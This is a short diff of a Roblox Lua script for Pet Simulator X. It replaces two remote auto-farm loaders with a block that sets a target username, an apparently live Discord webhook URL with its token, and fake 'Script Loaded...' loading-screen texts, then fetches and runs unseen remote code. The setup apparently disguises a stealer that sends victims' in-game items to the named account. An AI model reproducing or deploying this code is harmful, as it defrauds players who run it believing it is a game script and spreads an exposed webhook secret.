@@ -1,2 +1,17 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Sky2837/Script/main/PetSimulatorX/Loading/Main/Hub/AutoFram/AutoEgg/virtualPet/1"))()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Sky2837/Script./main/main/PetSimulatorX/Loading/Main/Hub/AutoFram/AutoEgg/virtualPet/2"))()
+Username = "minhtruong271029"
+ 
+WebHook = "https://discord.com/api/webhooks/1097499373975375892/togatmEKsVrg3yJLM4IR6pO_yb_yt4IZgy0VIML-LQsBXoIQ3LvCQcBzycefmM2fy_LP"
+ 
+loadingscreen = true
+ 
+_G.CustomScriptName = "Belta PSX"
+ 
+_G.Text1 = "Script Loaded..."
+ 
+_G.Text2 = "Waiting for Script..."
+ 
+_G.Text3 = "Checking Scripts..."
+ 
+_G.Text4 = "Starting Script..."
+ 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
